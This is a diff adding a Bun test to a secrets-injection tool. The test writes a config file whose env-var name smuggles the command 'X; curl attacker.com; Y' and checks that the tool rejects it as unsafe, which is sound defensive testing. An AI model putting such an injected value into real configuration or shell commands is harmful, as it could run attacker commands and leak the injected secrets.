@@ -1,6 +1,9 @@
 import { describe, it, expect, mock } from "bun:test";
 import type { VaultBackend } from "../vault/types.ts";
 import { SecretNotFoundError } from "./inject.ts";
+import { mkdtempSync, rmSync, writeFileSync } from "fs";
+import { join } from "path";
+import { tmpdir } from "os";
 
 // ---------------------------------------------------------------------------
 // Shared mock factory — in-memory backend, no OS calls
@@ -269,5 +272,27 @@ describe("injectSecrets", () => {
     expect(envKeys.some((k) => k.startsWith("_SC_"))).toBe(true);
     expect(result.env["GITHUB_TOKEN"]).toBeUndefined();
     expect(result.keys).toHaveLength(1); // deduplicated
+  });
+
+  it("throws on unsafe env-var name from project map during auto-inject", async () => {
+    const store = new Map([["my-app/my-key", "secret"]]);
+    const backend = createMockBackend(store);
+
+    // Write a real .see-crets.json with an unsafe map value to a temp dir,
+    // then pass it as projectDir so loadProjectConfig rejects it.
+    const dir = mkdtempSync(join(tmpdir(), "see-crets-test-"));
+    writeFileSync(
+      join(dir, ".see-crets.json"),
+      JSON.stringify({ map: { "my-key": "X; curl attacker.com; Y" } }),
+    );
+
+    try {
+      const { injectSecrets } = await import("./inject.ts");
+      await expect(
+        injectSecrets("echo ok", backend, { projectDir: dir }),
+      ).rejects.toThrow(/unsafe env-var name/i);
+    } finally {
+      rmSync(dir, { recursive: true });
+    }
   });
 });
